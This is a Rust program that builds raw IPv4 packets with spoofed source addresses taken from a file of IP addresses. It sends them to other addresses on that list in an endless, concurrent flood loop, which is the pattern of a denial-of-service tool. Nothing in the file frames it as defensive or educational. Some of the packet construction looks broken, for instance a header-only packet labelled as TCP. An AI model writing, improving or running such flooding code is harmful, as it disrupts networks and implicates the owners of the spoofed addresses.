use pnet::packet::{ip::IpNextHeaderProtocols, Packet};
use pnet::packet::ipv4::MutableIpv4Packet;
use pnet::transport::{transport_channel, TransportChannelType::Layer3, ipv4_packet_iter};
use rand::seq::SliceRandom;
use std::{fs, time::Duration};
use tokio::sync::Semaphore;
use std::net::Ipv4Addr;

const PACKET_SIZE: usize = 20;
const MAX_THREADS: usize = 100; // Adjust as needed

async fn send_random_null_packet(ip_list: &[Ipv4Addr], semaphore: &Semaphore) {
    let _permit = semaphore.acquire().await.unwrap();

    let mut packet = [0u8; PACKET_SIZE];
    let mut ipv4_packet = MutableIpv4Packet::new(&mut packet).unwrap();

    // Random source and destination IPs
    let src_ip = *ip_list.choose(&mut rand::thread_rng()).unwrap();
    let mut dst_ip = *ip_list.choose(&mut rand::thread_rng()).unwrap();
    while dst_ip == src_ip {
        dst_ip = *ip_list.choose(&mut rand::thread_rng()).unwrap();
    }

    // Fill in packet details
    ipv4_packet.set_version(4);
    ipv4_packet.set_header_length(5);
    ipv4_packet.set_total_length(PACKET_SIZE as u16);
    ipv4_packet.set_ttl(64);
    ipv4_packet.set_next_level_protocol(IpNextHeaderProtocols::Tcp); // Null payload
    ipv4_packet.set_source(src_ip);
    ipv4_packet.set_destination(dst_ip);

    // Send packet with error handling
    match transport_channel(1024, Layer3(IpNextHeaderProtocols::Tcp)) {
        Ok((mut tx, _)) => {
            if tx.send_to(ipv4_packet.packet(), dst_ip.into()).is_err() {
                eprintln!("Failed to send packet from {} to {}", src_ip, dst_ip);
            }
        }
        Err(e) => eprintln!("Failed to open transport channel: {:?}", e),
    }
}

async fn continuous_packet_flood(ip_list: Vec<Ipv4Addr>) {
    let semaphore = Semaphore::new(MAX_THREADS);

    loop {
        let permits: Vec<_> = (0..MAX_THREADS)
            .map(|_| send_random_null_packet(&ip_list, &semaphore))
            .collect();

        futures::future::join_all(permits).await;
        tokio::time::sleep(Duration::from_millis(10)).await;
    }
}

fn load_ip_list(filename: &str) -> Vec<Ipv4Addr> {
    fs::read_to_string(filename)
        .expect("Failed to read IP list")
        .lines()
        .map(|line| line.parse().unwrap()) // No validation; expects each line to be a valid IP
        .collect()
}

#[tokio::main]
async fn main() {
    let ip_list = load_ip_list("ips.txt");
    continuous_packet_flood(ip_list).await;
}
